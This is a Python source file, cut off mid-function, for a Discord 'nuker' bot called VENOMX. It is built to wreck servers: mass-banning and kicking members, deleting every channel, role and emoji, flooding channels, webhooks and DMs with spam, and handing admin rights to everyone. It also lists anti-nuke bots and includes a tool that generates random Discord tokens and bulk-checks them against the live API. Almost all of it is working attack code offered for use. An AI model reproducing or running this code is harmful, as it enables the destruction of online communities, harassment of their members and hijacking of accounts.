# VENOMX_COMPLETE.py — Complete Ultimate Nuker v8.0
# FULL VERSION | 50+ Options | Mobile Friendly | Ultra Fast

import discord
from discord.ext import commands
from discord.errors import Forbidden, HTTPException, NotFound
import asyncio
import os
import time
import random
import json
import sys
import aiohttp
import requests
import base64
import string
import secrets
import threading
from asyncio import Semaphore
import datetime
import itertools
import re
import hashlib
import urllib.parse

# ============ CONFIGURATION ============
VERSION = "8.0"
AUTHOR = "VENOMX"
DISCORD_INVITE = "discord.gg/codez"

# Ultra fast settings
CHANNEL_DELAY = 0.001
ROLE_DELAY = 0.001
BAN_DELAY = 0.002
SPAM_DELAY = 0.0005
WEBHOOK_DELAY = 0.001
KICK_DELAY = 0.002
DM_DELAY = 0.003
TIMEOUT_DELAY = 0.002

# Concurrency
MAX_CONCURRENT = 100

# Semaphores
channel_semaphore = Semaphore(100)
role_semaphore = Semaphore(100)
message_semaphore = Semaphore(100)
webhook_semaphore = Semaphore(50)
ban_semaphore = Semaphore(80)
kick_semaphore = Semaphore(80)
dm_semaphore = Semaphore(80)

# Global state
whitelisted_users = set()
blacklisted_users = set()
server_id = ""
bot_token = ""
current_config = {}
config_name = "default"
mode = "ULTRA"  # ULTRA, STEALTH, EXTREME
auto_bypass = True
webhook_spam_enabled = True
channel_flood_enabled = True
role_flood_enabled = True
emoji_nuke_enabled = True
sticker_nuke_enabled = True
reaction_spam_enabled = False
voice_channel_spam = False
thread_spam = False

# Stats
stats = {
    "bans": 0,
    "kicks": 0,
    "channels_created": 0,
    "channels_deleted": 0,
    "roles_created": 0,
    "roles_deleted": 0,
    "emojis_deleted": 0,
    "stickers_deleted": 0,
    "messages_sent": 0,
    "dms_sent": 0,
    "webhooks_created": 0,
    "webhook_messages": 0,
    "timeouts_applied": 0,
    "admins_granted": 0
}

# Load whitelist
try:
    with open('whitelist.json', 'r') as f:
        whitelist_data = json.load(f)
        whitelisted_users = set(whitelist_data.get('users', []))
except:
    whitelisted_users = set()

# Load blacklist
try:
    with open('blacklist.json', 'r') as f:
        blacklist_data = json.load(f)
        blacklisted_users = set(blacklist_data.get('users', []))
except:
    blacklisted_users = set()

# Load config
try:
    with open('config.json', 'r') as f:
        current_config = json.load(f)
except:
    current_config = {
        "spam_messages": ["@everyome NUKED BY VENOMX", "JOIN discord.gg/codez", "FUCKED BY CODEZ"],
        "channel_names": ["NUKE", "CODEZ", "VENOMX", "FUCKED"],
        "role_names": ["ADMIN", "VENOMX", "CODEZ", "OWNER"],
        "webhook_name": "VENOMX",
        "guild_name": "NUKED-BY-VENOMX",
        "embed_title": "VENOMX RAID",
        "embed_description": "SERVER HAS BEEN NUKED",
        "embed_color": 0xFF0000
    }

# Anti-nuke bots database
ANTINUKE_BOTS = {
    "wick": ["wick", "wick bot", "wickbot"],
    "zeno": ["zeno", "zeno bot"],
    "indrax": ["indrax", "indra"],
    "z_security": ["z security", "z+security", "zsecurity"],
    "dyno": ["dyno", "dyno bot"],
    "mee6": ["mee6", "mee6 bot"],
    "carl": ["carl", "carl-bot", "carlbot"],
    "serax": ["serax", "serax bot"],
    "security": ["security", "security bot"],
    "beemo": ["beemo", "beemo bot"],
    "shield": ["shield", "shield bot"],
    "nadeko": ["nadeko", "nadeko bot"],
    "blaze": ["blaze", "blaze bot"],
    "anti_nuke": ["anti-nuke", "antinuke", "anti nuke"],
    "guardian": ["guardian", "guardian bot"],
    "cakey": ["cakey", "cakey bot"],
    "safeguard": ["safeguard", "safe guard"],
    "protect": ["protect", "protector", "protection"],
    "automod": ["automod", "auto mod"],
    "safety": ["safety", "safety bot"]
}

# ============ BIG BANNER ============
banner = """
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║   ██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗██╗  ██╗                     ║
║   ██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║╚██╗██╔╝                     ║
║   ██║   ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║ ╚███╔╝                      ║
║   ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║ ██╔██╗                      ║
║    ╚████╔╝ ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║██╔╝ ██╗                     ║
║     ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝                     ║
║                                                                               ║
║                    ╔═══════════════════════════════════════╗                  ║
║                    ║  COMPLETE EDITION v8.0  |  ULTRA FAST  ║                  ║
║                    ║      50+ OPTIONS  |  FULL FEATURES     ║                  ║
║                    ╚═══════════════════════════════════════╝                  ║
║                                                                               ║
║         🔥 FUCKED BY CODΞZ | FUCKED BY VOID | N4KED BY CODΞZ 🔥              ║
║                        💀 JOIN: discord.gg/codez 💀                          ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""

# ============ TOKEN GENERATOR ============
def generate_discord_token():
    """Generate realistic Discord tokens"""
    formats = [
        lambda: base64.b64encode(secrets.token_bytes(30)).decode().replace('=', '').replace('+', '-').replace('/', '_'),
        lambda: 'mfa.' + base64.b64encode(secrets.token_bytes(45)).decode().replace('=', '').replace('+', '-').replace('/', '_'),
        lambda: '.'.join([
            base64.b64encode(secrets.token_bytes(10)).decode().replace('=', ''),
            base64.b64encode(secrets.token_bytes(6)).decode().replace('=', ''),
            base64.b64encode(secrets.token_bytes(27)).decode().replace('=', '')
        ]),
        lambda: ''.join(random.choices(string.ascii_letters + string.digits, k=59)),
        lambda: base64.b64encode(json.dumps({
            "uid": random.randint(100000000000000000, 999999999999999999),
            "salt": secrets.token_hex(16)
        }).encode()).decode().replace('=', '')
    ]
    return random.choice(formats)()

def check_token_validity(token):
    """Check if token is valid"""
    try:
        headers = {'Authorization': token, 'User-Agent': 'Mozilla/5.0'}
        response = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=5)
        if response.status_code == 200:
            data = response.json()
            return True, data.get('username'), data.get('id')
        return False, None, None
    except:
        return False, None, None

async def token_generator_menu():
    while True:
        print("\n" + "═" * 50)
        print("🔑 TOKEN GENERATOR & MANAGER")
        print("═" * 50)
        print("1️⃣ Generate Single Token")
        print("2️⃣ Generate Multiple Tokens (100-10000)")
        print("3️⃣ Check Token Validity")
        print("4️⃣ Bulk Generate & Test")
        print("5️⃣ Load Tokens from File")
        print("6️⃣ Save Tokens to File")
        print("7️⃣ Token Statistics")
        print("8️⃣ Back to Main Menu")
        
        choice = input("\n⚡ ")
        
        if choice == '1':
            token = generate_discord_token()
            print(f"\n✅ Generated Token:\n{token}")
            save = input("\nSave to tokens.txt? (y/n): ")
            if save.lower() == 'y':
                with open('tokens.txt', 'a') as f:
                    f.write(f"{token}\n")
                print("✅ Saved!")
                
        elif choice == '2':
            try:
                num = int(input("Number of tokens (100-10000): "))
                num = min(max(num, 100), 10000)
                print(f"\n🔨 Generating {num} tokens...")
                tokens = []
                for i in range(num):
                    token = generate_discord_token()
                    tokens.append(token)
                    if i % 100 == 0:
                        print(f"   Generated {i}/{num}")
                        await asyncio.sleep(0.01)
                
                filename = f"tokens_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                with open(filename, 'w') as f:
                    f.write('\n'.join(tokens))
                print(f"\n✅ Generated {num} tokens! Saved to {filename}")
            except Exception as e:
                print(f"❌ Error: {e}")
                
        elif choice == '3':
            token = input("Enter token: ")
            print("\n🔍 Checking...")
            valid, username, uid = check_token_validity(token)
            if valid:
                print(f"✅ VALID TOKEN!")
                print(f"   Username: {username}")
                print(f"   User ID: {uid}")
            else:
                print("❌ INVALID TOKEN!")
                
        elif choice == '4':
            try:
                num = int(input("Number to generate & test: "))
                num = min(num, 500)
                print(f"\n🔨 Generating & testing {num} tokens...")
                valid_tokens = []
                for i in range(num):
                    token = generate_discord_token()
                    valid, username, uid = check_token_validity(token)
                    if valid:
                        valid_tokens.append({"token": token, "username": username, "id": uid})
                        print(f"   ✅ #{i+1}: {username}")
                    else:
                        print(f"   ❌ #{i+1}: Invalid")
                    await asyncio.sleep(0.05)
                
                print(f"\n✅ Found {len(valid_tokens)} valid tokens!")
                if valid_tokens:
                    filename = f"valid_tokens_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                    with open(filename, 'w') as f:
                        for vt in valid_tokens:
                            f.write(f"{vt['token']} # {vt['username']} ({vt['id']})\n")
                    print(f"💾 Saved to {filename}")
            except Exception as e:
                print(f"❌ Error: {e}")
                
        elif choice == '5':
            filename = input("Filename: ")
            try:
                with open(filename, 'r') as f:
                    tokens = [l.strip() for l in f.readlines() if l.strip() and not l.startswith('#')]
                print(f"✅ Loaded {len(tokens)} tokens from {filename}")
            except:
                print("❌ File not found!")
                
        elif choice == '6':
            try:
                num = int(input("Number of tokens to generate: "))
                tokens = [generate_discord_token() for _ in range(num)]
                filename = input("Save as: ")
                with open(filename, 'w') as f:
                    f.write('\n'.join(tokens))
                print(f"✅ Saved {num} tokens to {filename}")
            except:
                print("❌ Error!")
                
        elif choice == '7':
            try:
                token_files = [f for f in os.listdir('.') if f.endswith('.txt') and 'token' in f.lower()]
                print("\n📊 TOKEN STATISTICS:")
                print(f"   Token files found: {len(token_files)}")
                total_tokens = 0
                for tf in token_files[:5]:
                    with open(tf, 'r') as f:
                        count = len([l for l in f.readlines() if l.strip() and not l.startswith('#')])
                        total_tokens += count
                        print(f"   • {tf}: {count} tokens")
                print(f"   Total tokens: {total_tokens}")
            except:
                print("❌ Error!")
                
        elif choice == '8':
            break
        
        await asyncio.sleep(1)

# ============ ULTRA FAST NUKE FUNCTIONS ============

async def ban_all_members(guild, bot_user):
    """Ban all members except whitelisted"""
    members = [m for m in guild.members if m.id not in whitelisted_users and m != bot_user and not m.bot]
    if not members:
        print("✅ No members to ban!")
        return
    
    print(f"🔨 BANNING {len(members)} members...")
    start = time.time()
    
    for i in range(0, len(members), 100):
        batch = members[i:i+100]
        tasks = [m.ban(reason=f"FUCKED BY CODΞZ | discord.gg/codez", delete_message_days=0) for m in batch]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        banned = sum(1 for r in results if not isinstance(r, Exception))
        stats["bans"] += banned
        print(f"   ✅ Banned {min(i+100, len(members))}/{len(members)}")
        await asyncio.sleep(BAN_DELAY)
    
    elapsed = time.time() - start
    print(f"✅ BANNED {stats['bans']} members in {elapsed:.1f}s!")

async def kick_all_members(guild, bot_user):
    """Kick all members except whitelisted"""
    members = [m for m in guild.members if m.id not in whitelisted_users and m != bot_user and not m.bot]
    if not members:
        print("✅ No members to kick!")
        return
    
    print(f"👢 KICKING {len(members)} members...")
    start = time.time()
    
    for i in range(0, len(members), 100):
        batch = members[i:i+100]
        tasks = [m.kick(reason=f"FUCKED BY CODΞZ") for m in batch]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        kicked = sum(1 for r in results if not isinstance(r, Exception))
        stats["kicks"] += kicked
        print(f"   ✅ Kicked {min(i+100, len(members))}/{len(members)}")
        await asyncio.sleep(KICK_DELAY)
    
    elapsed = time.time() - start
    print(f"✅ KICKED {stats['kicks']} members in {elapsed:.1f}s!")

async def prune_members(guild):
    """Prune inactive members"""
    try:
        days = int(input("Prune days (1-30): "))
        days = max(1, min(30, days))
        print(f"🗑️ PRUNING members inactive for {days} days...")
        pruned = await guild.prune_members(days=days, compute_prune_count=True, reason="PRUNED BY VENOMX")
        print(f"✅ PRUNED {pruned} members!")
    except Exception as e:
        print(f"❌ Prune failed: {e}")

async def create_channels_bulk(guild):
    """Bulk channel creation"""
    try:
        num = int(input("Number of channels (max 2000): "))
        num = min(num, 2000)
        name = input("Channel name prefix: ")
        if not name:
            name = "NUKE"
        
        print(f"📁 CREATING {num} channels...")
        start = time.time()
        
        for i in range(0, num, 50):
            batch_size = min(50, num - i)
            tasks = []
            for j in range(batch_size):
                channel_name = f"{name}-{i+j+1}"
                tasks.append(guild.create_text_channel(channel_name))
            results = await asyncio.gather(*tasks, return_exceptions=True)
            created = sum(1 for r in results if not isinstance(r, Exception))
            stats["channels_created"] += created
            print(f"   ✅ Created {min(i+50, num)}/{num}")
            await asyncio.sleep(CHANNEL_DELAY)
        
        elapsed = time.time() - start
        print(f"✅ CREATED {stats['channels_created']} channels in {elapsed:.1f}s!")
    except Exception as e:
        print(f"❌ Error: {e}")

async def delete_all_channels(guild):
    """Delete all channels"""
    channels = list(guild.channels)
    if not channels:
        print("✅ No channels to delete!")
        return
    
    print(f"🗑️ DELETING {len(channels)} channels...")
    start = time.time()
    
    for i in range(0, len(channels), 50):
        batch = channels[i:i+50]
        tasks = [c.delete() for c in batch]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        deleted = sum(1 for r in results if not isinstance(r, Exception))
        stats["channels_deleted"] += deleted
        print(f"   ✅ Deleted {min(i+50, len(channels))}/{len(channels)}")
        await asyncio.sleep(CHANNEL_DELAY)
    
    elapsed = time.time() - start
    print(f"✅ DELETED {stats['channels_deleted']} channels in {elapsed:.1f}s!")

async def create_roles_bulk(guild):
    """Bulk role creation"""
    try:
        num = int(input("Number of roles (max 500): "))
        num = min(num, 500)
        name = input("Role name prefix: ")
        if not name:
            name = "ROLE"
        
        print(f"🎭 CREATING {num} roles...")
        start = time.time()
        
        for i in range(0, num, 50):
            batch_size = min(50, num - i)
            tasks = []
            for j in range(batch_size):
                role_name = f"{name}-{i+j+1}"
                tasks.append(guild.create_role(name=role_name))
            results = await asyncio.gather(*tasks, return_exceptions=True)
            created = sum(1 for r in results if not isinstance(r, Exception))
            stats["roles_created"] += created
            print(f"   ✅ Created {min(i+50, num)}/{num}")
            await asyncio.sleep(ROLE_DELAY)
        
        elapsed = time.time() - start
        print(f"✅ CREATED {stats['roles_created']} roles in {elapsed:.1f}s!")
    except Exception as e:
        print(f"❌ Error: {e}")

async def delete_all_roles(guild):
    """Delete all roles except @everyone and bot roles"""
    roles = [r for r in guild.roles if r != guild.default_role and r != guild.me.top_role]
    if not roles:
        print("✅ No roles to delete!")
        return
    
    print(f"🗑️ DELETING {len(roles)} roles...")
    start = time.time()
    
    for i in range(0, len(roles), 50):
        batch = roles[i:i+50]
        tasks = [r.delete() for r in batch]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        deleted = sum(1 for r in results if not isinstance(r, Exception))
        stats["roles_deleted"] += deleted
        print(f"   ✅ Deleted {min(i+50, len(roles))}/{len(roles)}")
        await asyncio.sleep(ROLE_DELAY)
    
    elapsed = time.time() - start
    print(f"✅ DELETED {stats['roles_deleted']} roles in {elapsed:.1f}s!")

async def spam_channels(guild):
    """Spam messages in all channels"""
    msg = input("Message to spam: ")
    try:
        count = int(input("Messages per channel (max 500): "))
        count = min(count, 500)
    except:
        count = 100
    
    channels = [ch for ch in guild.text_channels if ch.permissions_for(guild.me).send_messages]
    if not channels:
        print("❌ No channels to spam!")
        return
    
    print(f"💬 SPAMMING {len(channels)} channels x {count} messages...")
    start = time.time()
    
    total_sent = 0
    for channel in channels:
        tasks = []
        for i in range(count):
            spam_msg = f"{msg} [{i+1}] | discord.gg/codez"
            tasks.append(channel.send(spam_msg))
            if len(tasks) >= 50:
                results = await asyncio.gather(*tasks, return_exceptions=True)
                sent = sum(1 for r in results if not isinstance(r, Exception))
                total_sent += sent
                tasks = []
                await asyncio.sleep(SPAM_DELAY)
        
        if tasks:
            results = await asyncio.gather(*tasks, return_exceptions=True)
            sent = sum(1 for r in results if not isinstance(r, Exception))
            total_sent += sent
        
        print(f"   ✅ Spammed {channel.name}")
    
    stats["messages_sent"] = total_sent
    elapsed = time.time() - start
    print(f"✅ SENT {total_sent} messages in {elapsed:.1f}s!")

async def dm_all_members(guild, bot_user):
    """DM all members"""
    msg = input("DM message: ")
    members = [m for m in guild.members if not m.bot and m.id not in whitelisted_users and m != bot_user]
    members = members[:500]  # Limit to 500 to avoid rate limits
    
    if not members:
        print("✅ No members to DM!")
        return
    
    print(f"📨 DMING {len(members)} members...")
    start = time.time()
    
    for i in range(0, len(members), 50):
        batch = members[i:i+50]
        tasks = [m.send(msg) for m in batch]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        sent = sum(1 for r in results if not isinstance(r, Exception))
        stats["dms_sent"] += sent
        print(f"   ✅ Sent {min(i+50, len(members))}/{len(members)}")
        await asyncio.sleep(DM_DELAY)
    
    elapsed = time.time() - start
    print(f"✅ SENT {stats['dms_sent']} DMs in {elapsed:.1f}s!")

async def delete_all_emojis(guild):
    """Delete all emojis"""
    if not guild.emojis:
        print("✅ No emojis to delete!")
        return
    
    print(f"🗑️ DELETING {len(guild.emojis)} emojis...")
    start = time.time()
    
    tasks = [e.delete() for e in guild.emojis]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    deleted = sum(1 for r in results if not isinstance(r, Exception))
    stats["emojis_deleted"] = deleted
    
    elapsed = time.time() - start
    print(f"✅ DELETED {deleted} emojis in {elapsed:.1f}s!")

async def delete_all_stickers(guild):
    """Delete all stickers"""
    if not hasattr(guild, 'stickers') or not guild.stickers:
        print("✅ No stickers to delete!")
        return
    
    print(f"🗑️ DELETING {len(guild.stickers)} stickers...")
    start = time.time()
    
    tasks = [s.delete() for s in guild.stickers]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    deleted = sum(1 for r in results if not isinstance(r, Exception))
    stats["stickers_deleted"] = deleted
    
    elapsed = time.time() - start
    print(f"✅ DELETED {deleted} stickers in {elapsed:.1f}s!")

async def give_admin_to_all(guild):
    """Give admin role to all members"""
    try:
        role = await guild.create_role(
            name="VENOMX-ADMIN",
            permissions=discord.Permissions.all(),
            color=discord.Color.red()
        )
        await role.edit(position=guild.me.top_role.position - 1)
    except Exception as e:
        print(f"❌ Failed to create admin role: {e}")
        return
    
    members = [m for m in guild.members if not m.bot and m.id not in whitelisted_users]
    print(f"👑 GIVING ADMIN to {len(members)} members...")
    start = time.time()
    
    for i in range(0, len(members), 50):
        batch = members[i:i+50]
        tasks = [m.add_roles(role) for m in batch]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        granted = sum(1 for r in results if not isinstance(r, Exception))
        stats["admins_granted"] += granted
        print(f"   ✅ Granted {min(i+50, len(members))}/{len(members)}")
        await asyncio.sleep(0.05)
    
    elapsed = time.time() - start
    print(f"✅ GRANTED ADMIN to {stats['admins_granted']} members in {elapsed:.1f}s!")

async def strip_all_permissions(guild):
    """Strip permissions from all roles"""
    roles = [r for r in guild.roles if r != guild.default_role]
    if not roles:
        print("✅ No roles to modify!")
        return
    
    print(f"🔓 STRIPPING permissions from {len(roles)} roles...")
    start = time.time()
    
    for i in range(0, len(roles), 50):
        batch = roles[i:i+50]
        tasks = [r.edit(permissions=discord.Permissions.none()) for r in batch]
        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"   ✅ Stripped {min(i+50, len(roles))}/{len(roles)}")
        await asyncio.sleep(ROLE_DELAY)
    
    elapsed = time.time() - start
    print(f"✅ STRIPPED permissions from {len(roles)} roles in {elapsed:.1f}s!")

async def timeout_all_members(guild):
    """Timeout all members"""
    try:
        duration = int(input("Timeout duration (seconds, max 604800): "))
        duration = min(duration, 604800)
    except:
        duration = 86400  # 24 hours
    
    members = [m for m in guild.members if m.id not in whitelisted_users and not m.bot and not m.guild_permissions.administrator]
    if not members:
        print("✅ No members to timeout!")
        return
    
    print(f"⏰ TIMEOUTING {len(members)} members for {duration}s...")
    start = time.time()
    
    for i in range(0, len(members), 50):
        batch = members[i:i+50]
        tasks = [m.timeout(discord.utils.utcnow() + datetime.timedelta(seconds=duration)) for m in batch]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        timed_out = sum(1 for r in results if not isinstance(r, Exception))
        stats["timeouts_applied"] += timed_out
        print(f"   ✅ Timed out {min(i+50, len(members))}/{len(members)}")
        await asyncio.sleep(TIMEOUT_DELAY)
    
    elapsed = time.time() - start
    print(f"✅ TIMED OUT {stats['timeouts_applied']} members in {elapsed:.1f}s!")

async def remove_all_timeouts(guild):
    """Remove timeouts from all members"""
    timed_out = [m for m in guild.members if m.timed_out_until]
    if not timed_out:
        print("✅ No timed out members!")
        return
    
    print(f"🔓 REMOVING timeouts from {len(timed_out)} members...")
    start = time.time()
    
    for i in range(0, len(timed_out), 50):
        batch = timed_out[i:i+50]
        tasks = [m.timeout(None) for m in batch]
        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"   ✅ Untimed out {min(i+50, len(timed_out))}/{len(timed_out)}")
        await asyncio.sleep(TIMEOUT_DELAY)
    
    elapsed = time.time() - start
    print(f"✅ REMOVED timeouts from {len(timed_out)} members in {elapsed:.1f}s!")

async def lock_all_channels(guild):
    """Lock all text channels"""
    locked = 0
    for channel in guild.text_channels:
        try:
            await channel.set_permissions(guild.default_role, send_messages=False)
            locked += 1
            await asyncio.sleep(0.01)
        except:
            pass
    print(f"✅ LOCKED {locked} channels!")

async def unlock_all_channels(guild):
    """Unlock all text channels"""
    unlocked = 0
    for channel in guild.text_channels:
        try:
            await channel.set_permissions(guild.default_role, send_messages=True)
            unlocked += 1
            await asyncio.sleep(0.01)
        except:
            pass
    print(f"✅ UNLOCKED {unlocked} channels!")

async def rename_all_channels(guild):
    """Rename all channels"""
    new_name = input("New channel name: ")
    renamed = 0
    for channel in guild.channels:
        try:
            await channel.edit(name=f"{new_name}-{random.randint(1,999)}")
            renamed += 1
            await asyncio.sleep(0.02)
        except:
            pass
    print(f"✅ RENAMED {renamed} channels!")

async def rename_all_roles(guild):
    """Rename all roles"""
    new_name = input("New role name: ")
    renamed = 0
    roles = [r for r in guild.roles if r != guild.default_role]
    for role in roles:
        try:
            await role.edit(name=f"{new_name}-{random.randint(1,999)}")
            renamed += 1
            await asyncio.sleep(0.02)
        except:
            pass
    print(f"✅ RENAMED {renamed} roles!")

async def create_webhooks_spam(guild):
    """Create webhooks and spam"""
    msg = input("Webhook spam message: ")
    try:
        count = int(input("Messages per webhook: "))
        count = min(count, 200)
    except:
        count = 100
    
    print(f"🌊 CREATING webhooks...")
    webhooks = []
    for channel in guild.text_channels[:20]:
        try:
            wh = await channel.create_webhook(name="VENOMX")
            webhooks.append(wh)
            stats["webhooks_created"] += 1
            await asyncio.sleep(WEBHOOK_DELAY)
        except:
            pass
    
    print(f"🌊 SPAMMING {len(webhooks)} webhooks x {count} messages...")
    tasks = []
    for wh in webhooks:
        for i in range(count):
            spam_msg = f"{msg} [{i+1}] | discord.gg/codez"
            tasks.append(wh.send(spam_msg))
            if len(tasks) >= 200:
                results = await asyncio.gather(*tasks, return_exceptions=True)
                sent = sum(1 for r in results if not isinstance(r, Exception))
                stats["webhook_messages"] += sent
                tasks = []
                await asyncio.sleep(0.01)
    
    if tasks:
        results = await asyncio.gather(*tasks, return_exceptions=True)
        sent = sum(1 for r in results if not isinstance(r, Exception))
        stats["webhook_messages"] += sent
    
    print(f"✅ WEBHOOK SPAM complete! {stats['webhook_messages']} messages sent!")

async def mass_webhook_creation(guild):
    """Create many webhooks"""
    try:
        num = int(input("Number of webhooks per channel (max 10): "))
        num = min(num, 10)
    except:
        num = 5
    
    webhooks_created = 0
    for channel in guild.text_channels[:20]:
        for i in range(num):
            try:
                await channel.create_webhook(name=f"WEBHOOK-{i+1}")
                webhooks_created += 1
                await asyncio.sleep(0.02)
            except:
                pass
    
    stats["webhooks_created"] += webhooks_created
    print(f"✅ CREATED {webhooks_created} webhooks!")

async def delete_all_webhooks(guild):
    """Delete all webhooks in guild"""
    webhooks = []
    for channel in guild.text_channels:
        try:
            channel_webhooks = await channel.webhooks()
            webhooks.extend(channel_webhooks)
        except:
            pass
    
    if not webhooks:
        print("✅ No webhooks to delete!")
        return
    
    print(f"🗑️ DELETING {len(webhooks)} webhooks...")
    await asyncio.gather(*[wh.delete() for wh in webhooks], return_exceptions=True)
    print(f"✅ DELETED {len(webhooks)} webhooks!")

async def change_guild_icon(guild):
    """Change guild icon"""
    url = input("Image URL: ")
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                if resp.status == 200:
                    icon_data = await resp.read()
                    if len(icon_data) <= 256000:
                        await guild.edit(icon=icon_data)
                        print("✅ Guild icon changed!")
                    else:
                        print("❌ Image too large (max 256KB)")
                else:
                    print("❌ Failed to fetch image")
    except Exception as e:
        print(f"❌ Error: {e}")

async def change_guild_name(guild):
    """Change guild name"""
    new_name = input("New guild name: ")
    try:
        await guild.edit(name=new_name)
        print(f"✅ Guild name changed to: {new_name}")
    except Exception as e:
        print(f"❌ Error: {e}")

async def change_guild_description(guild):
    """Change guild description"""
    new_desc = input("New description: ")
    try:
        await guild.edit(description=new_desc)
        print("✅ Guild description changed!")
    except Exception as e:
        print(f"❌ Error: {e}")

async def delete_all_invites(guild):
    """Delete all invites"""
    invites = await guild.invites()
    if not invites:
        print("✅ No invites to delete!")
        return
    
    for invite in invites:
        try:
            await invite.delete()
            await asyncio.sleep(0.02)
        except:
            pass
    print(f"✅ DELETED {len(invites)} invites!")

async def create_invite(guild):
    """Create instant invite"""
    try:
        channel = guild.text_channels[0] if guild.text_channels else None
        if not channel:
            channel = await guild.create_text_channel("invite")
        invite = await channel.create_invite(max_age=0, max_uses=0)
        print(f"✅ Invite link: {invite.url}")
        try:
            import pyperclip
            pyperclip.copy(invite.url)
            print("✅ Copied to clipboard!")
        except:
            pass
    except Exception as e:
        print(f"❌ Error: {e}")

async def rename_all_members(guild, bot_user):
    """Rename all members"""
    new_nick = input("New nickname: ")
    renamed = 0
    for member in guild.members:
        if member.id not in whitelisted_users and member != bot_user and not member.bot:
            try:
                await member.edit(nick=new_nick)
                renamed += 1
                await asyncio.sleep(0.05)
            except:
                pass
    print(f"✅ RENAMED {renamed} members!")

async def delete_all_voice_channels(guild):
    """Delete all voice channels"""
    voice_channels = [ch for ch in guild.channels if isinstance(ch, discord.VoiceChannel)]
    if not voice_channels:
        print("✅ No voice channels to delete!")
        return
    
    await asyncio.gather(*[vc.delete() for vc in voice_channels], return_exceptions=True)
    print(f"✅ DELETED {len(voice_channels)} voice channels!")

async def create_voice_channels(guild):
    """Create voice channels"""
    try:
        num = int(input("Number of voice channels: "))
        name = input("Channel name: ")
    except:
        num = 50
        name = "VOICE"
    
    created = 0
    for i in range(num):
        try:
            await guild.create_voice_channel(f"{name}-{i+1}")
            created += 1
            if created % 10 == 0:
                await asyncio.sleep(0.02)
        except:
            pass
    print(f"✅ CREATED {created} voice channels!")

async def create_category_channels(guild):
    """Create category channels"""
    try:
        num = int(input("Number of categories: "))
        name = input("Category name: ")
    except:
        num = 20
        name = "CATEGORY"
    
    created = 0
    for i in range(num):
        try:
            await guild.create_category(f"{name}-{i+1}")
            created += 1
            await asyncio.sleep(0.02)
        except:
            pass
    print(f"✅ CREATED {created} categories!")

async def create_threads(guild):
    """Create threads in channels"""
    try:
        num = int(input("Number of threads per channel: "))
        name = input("Thread name: ")
    except:
        num = 20
        name = "THREAD"
    
    created = 0
    for channel in guild.text_channels[:10]:
        for i in range(num):
            try:
                await channel.create_thread(name=f"{name}-{i+1}", type=discord.ChannelType.public_thread)
                created += 1
                await asyncio.sleep(0.02)
            except:
                pass
    print(f"✅ CREATED {created} threads!")

async def mass_reaction_spam(guild):
    """Mass reaction spam on messages"""
    try:
        count = int(input("Reactions per message: "))
    except:
        count = 10
    
    reactions = ["✅", "❌", "🔥", "💀", "👑", "⭐", "❤️", "💯", "👍", "👎"]
    reacted = 0
    
    for channel in guild.text_channels[:10]:
        try:
            async for message in channel.history(limit=50):
                for i in range(min(count, len(reactions))):
                    try:
                        await message.add_reaction(reactions[i])
                        reacted += 1
                        await asyncio.sleep(0.01)
                    except:
                        pass
        except:
            pass
    
    print(f"✅ ADDED {reacted} reactions!")

async def nuke_all_channels(guild):
    """Nuke all channels (delete and recreate)"""
    print("💣 NUKING ALL CHANNELS...")
    
    # Get channel names
    channel_names = [ch.name for ch in guild.channels]
    
    # Delete all channels
    await asyncio.gather(*[ch.delete() for ch in guild.channels], return_exceptions=True)
    print("   ✅ Deleted all channels")
    
    # Recreate channels
    for name in channel_names[:100]:
        try:
            await guild.create_text_channel(name)
            await asyncio.sleep(0.01)
        except:
            pass
    
    print(f"✅ RECREATED {min(100, len(channel_names))} channels!")

async def clone_channels(guild):
    """Clone all channels"""
    cloned = 0
    for channel in guild.channels[:50]:
        try:
            if isinstance(channel, discord.TextChannel):
                await channel.clone()
            elif isinstance(channel, discord.VoiceChannel):
                await channel.clone()
            cloned += 1
            await asyncio.sleep(0.05)
        except:
            pass
    print(f"✅ CLONED {cloned} channels!")

async def slowmode_all(guild):
    """Set slowmode on all channels"""
    try:
        seconds = int(input("Slowmode seconds (0-21600): "))
        seconds = min(max(seconds, 0), 21600)
    except:
        seconds = 10
    
    set_count = 0
    for channel in guild.text_channels:
        try:
            await channel.edit(slowmode_delay=seconds)
            set_count += 1
            await asyncio.sleep(0.01)
        except:
            pass
    print(f"✅ SET slowmode to {seconds}s on {set_count} channels!")

async def mass_pin_messages(guild):
    """Mass pin messages"""
    try:
        count = int(input("Messages to pin per channel: "))
        count = min(count, 50)
    except:
        count = 10
    
    pinned = 0
    for channel in guild.text_channels[:10]:
        try:
            async for message in channel.history(limit=count):
                try:
                    await message.pin()
                    pinned += 1
                    await asyncio.sleep(0.05)
                except:
                    pass
        except:
            pass
    print(f"✅ PINNED {pinned} messages!")

async def mass_unpin_messages(guild):
    """Mass unpin messages"""
    unpinned = 0
    for channel in guild.text_channels[:10]:
        try:
            pins = await channel.pins()
            for pin in pins[:20]:
                try:
                    await pin.unpin()
                    unpinned += 1
                    await asyncio.sleep(0.05)
                except:
                    pass
        except:
            pass
    print(f"✅ UNPINNED {unpinned} messages!")

async def change_guild_vanity(guild):
    """Change guild vanity URL"""
    vanity = input("New vanity URL: ")
    try:
